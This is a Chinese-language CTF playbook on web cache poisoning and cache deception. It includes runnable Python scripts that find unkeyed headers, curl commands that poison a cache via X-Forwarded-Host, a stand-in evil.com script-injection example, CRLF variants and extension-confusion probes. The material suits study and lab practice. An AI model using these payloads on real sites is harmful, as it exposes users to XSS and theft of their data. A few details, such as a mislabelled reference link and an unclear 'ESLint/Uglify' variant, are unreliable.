---
title: Web 缓存投毒与缓存欺骗（Cache Poisoning / Deception）
category: web
tags: [cache-poisoning, cache-deception, 缓存键, host-header, cdn]
signals:
  - "响应头出现 X-Cache: HIT 或 cf-cache-status: HIT"
  - "响应头里有 Age 且连续请求时数值递增"
  - "页面里回显了我们塞进 X-Forwarded-Host 的域名"
  - "响应出现 Via: 1.1 varnish 或 X-Varnish"
  - "静态资源 /static 走 CDN，且响应不带 Set-Cookie"
  - "提示词出现 缓存 / CDN / purge / cache key"
  - "访问 /account/x.css 返回的却是个人资料页 HTML"
  - "Vary 头只写了 User-Agent 或干脆没有"
  - "响应 Cache-Control 是 public, max-age 较大"
difficulty: hard
source: "PortSwigger / HackTricks / Fastly"
tools: [burpsuite, param-miner, python]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 响应头：`X-Cache: HIT / MISS`、`cf-cache-status: HIT`、`Age: 123`、`Via: 1.1 varnish`、`X-Varnish`。
- 页面 HTML 中出现我们控制的 `X-Forwarded-Host`、`X-Forwarded-Scheme`、`X-Host` 值（用于生成绝对 URL、JS 的 `src`、`<base href>`）。
- `/static/*`、`/images/*` 由 CDN 缓存且**不看 cookie**。
- 题面提示：`缓存`、`CDN`、`投毒`、`purge`、`cache`、`X-Cache`。
- 随便加个 `/a/b/c.js`、`;.css`、`/x.png` 后缀，返回的却是 `/profile` 的 HTML。
- 出现 `Vary: User-Agent`（说明 UA 在 key 里，别的 header 可能不在）。

## 二、原理

### 1. 缓存键（cache key）与未键控输入

```
cache_key = host + path + query (可能去掉某些参数)
```

只要某个**影响响应内容**的输入**没有**加入 cache key，就能"给缓存下毒"：

| 未键控输入 | 注入位置 | 后果 |
|---|---|---|
| `X-Forwarded-Host` | `<script src=...>` 绝对 URL | 加载攻击者 JS → XSS |
| `X-Forwarded-Scheme: nothttps` | 302 Location | 重定向到攻击域 |
| `X-Original-URL` | 路由 | 访问受保护路径 |
| `?utm_source=`（被去掉的参数） | 回显 | 参数伪装 |
| `User-Agent`（Vary 缺失时） | 回显 | 定制投毒 |

### 2. 三步法：确认 / 定位 / 利用

1. **确认被缓存**：同一 URL 连请求两次，第二次 `X-Cache: HIT` 或 `Age` 增大。
2. **确认输入被反射**：带随机值 `X-Test: 0xabc123` 请求，看响应里是否出现。
3. **确认输入在 key 外**：改为已在缓存里的合法值（如 `X-Forwarded-Host: evil.com`），再请求一次无该 header 的干净 URL，如果**仍**返回带 `evil.com` 的内容 → 投毒成功。

### 3. 缓存欺骗（Cache Deception）

CDN 认为 `.css`/`.js`/`.png` 可缓存，但后端把 `/profile/x.css` 路由到 `/profile`（permissive 路由）。于是：

- 受害者访问 `https://target/profile/victim.css`；
- CDN 缓存**含有受害者个人信息的 HTML**；
- 攻击者访问同一 URL，直接读到受害者数据。

### 4. 缓存投毒 → 存储型 XSS（CTF 里最值钱）

```
GET /?cb=<random>  HTTP/1.1
Host: target
X-Forwarded-Host: evil.com      ← 未键控
```

响应里 `<script src="http://evil.com/v1.2.3.js">` 被缓存 → 全体用户中招。

## 三、解题步骤

1. **探缓存**：对 `/`、`/index.html`、`/static/app.js` 连打两次，看 `X-Cache`。
2. **列未键控 header**：用 **param-miner** 的 `Cache poisoning` 检测器，它会自动试常见 header（`X-Forwarded-Host`、`X-Forwarded-Scheme`、`X-Host`、`X-Original-URL`、`Forwarded`、`X-Rewrite-URL`）。
3. **验证反射**：`X-Forwarded-Host: 0xabc.evil` 出现在哪 — `src`、`href`、`Location`、`<base>`。
4. **清缓存/换 key**：加随机 query（`?cb=123`）避免命中已有缓存，每个 key 单独投毒。
5. **投放**：等缓存到期（看 `Cache-Control: max-age` / `Age`），让受害者（bot）访问**干净 URL**。
6. **缓存欺骗**：观察 `/account/x.css`、`/api/me/.js`、`/profile/%2e%2e%2f.css` 这类扩展名混淆。

## 四、可直接运行的脚本

探测缓存行为：

```python
import requests, random, string

URL = "http://TARGET/"

def probe(extra_headers=None, qs=""):
    h = {"User-Agent": "Mozilla/5.0"}
    if extra_headers: h.update(extra_headers)
    r = requests.get(URL + qs, headers=h, timeout=15)
    hdrs = {k.lower(): v for k, v in r.headers.items()}
    return {
        "status": r.status_code,
        "x-cache": hdrs.get("x-cache"),
        "cf-cache": hdrs.get("cf-cache-status"),
        "age": hdrs.get("age"),
        "vary": hdrs.get("vary"),
        "cc": hdrs.get("cache-control"),
        "len": len(r.content),
    }

print("cold:", probe(qs="?cb=%s" % "".join(random.choices(string.ascii_lowercase, k=8))))
print("warm:", probe(qs="?cb=%s" % "".join(random.choices(string.ascii_lowercase, k=8))))
```

未键控 header 自动检测（找反射点）：

```python
import requests, uuid, re

URL = "http://TARGET/"
HEADERS = [
    "X-Forwarded-Host", "X-Forwarded-Scheme", "X-Host", "X-Original-URL",
    "X-Rewrite-URL", "Forwarded", "X-Forwarded-Server", "X-HTTP-Host-Override",
    "X-Original-Host", "X-Forwarded-Port", "X-Backend-Host",
]

for h in HEADERS:
    token = "px" + uuid.uuid4().hex[:6]
    try:
        r = requests.get(URL, headers={h: token}, timeout=10)
    except Exception as e:
        print(h, "ERR", e); continue
    if token in r.text:
        ctx = r.text[max(0, r.text.index(token)-60): r.text.index(token)+60]
        print("[REFLECT]", h, "=>", ctx.replace("\n", " ")[:140])
```

完整投毒（PoC）：

```bash
# 1) 用一个新 key 请求，并注入
curl -si 'http://TARGET/?cb=1' -H 'X-Forwarded-Host: evil.TARGET' | head -20

# 2) 立刻无 header 请求同 key，确认中毒
curl -si 'http://TARGET/?cb=1' | grep -E 'evil|X-Cache|Age'
```

缓存欺骗探针：

```bash
for suf in .css .js .png .ico .txt /.css /%2e%2e.css ';.css'; do
  echo "== $suf"
  curl -s -o /dev/null -w '%{http_code} %{content_type} %{size_download}\n' \
    "https://TARGET/profile$suf"
done
```

## 五、常见坑 / 变体

- **缓存键含 query**：加 `?cb=` 换 key，但**bot 访问的是干净 URL**（不带 cb）→ 投毒必须落在干净 key 上；用短 TTL + 竞速。
- **`Cache-Control: private`**：不缓存，只能打"CDN 忽略 no-cache 回源头"的配置错误。
- **`Vary: Cookie` 缺失**：这是缓存欺骗的前提（`/profile` 内容随 cookie 变，却按路径缓存）。
- **header 被 CDN 吃掉**：`X-Forwarded-Host` 被规范化，改试 `X-Forwarded-Host: a\x0d...`、`X-Host`。
- **URL 编码后的 `\r\n`**：`%0d%0a` 注入到 Location。
- **变体：`X-Forwarded-Scheme: nothttps`** → 302 到 https://evil（响应拆分）。
- **变体：参数伪装（Parameter Cloaking）** → `?utm=1&x=2` 中 `x` 被缓存键忽略，但后端读它。
- **变体：ESLint/Uglify 融合** → 响应 HTML 里 `<script src=x>` 加载失败后 `onerror` 触发。
- **变体：`age:0` 永不缓存** → 只能靠"缓存清理窗口"打时间差。

## 六、参考来源

- [PortSwigger — Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger — Web cache deception](https://portswigger.net/web-security/web-cache-deception)
- [HackTricks — Cache Deception](https://book.hacktricks.wiki/en/pentesting-web/cache-deception/index.html)
- [Fastly — What is cache poisoning](https://www.fastly.com/learning/security/what-is-http-request-smuggling)
- [PortSwigger — Host header attacks](https://portswigger.net/web-security/host-header)
- [param-miner](https://github.com/PortSwigger/param-miner)
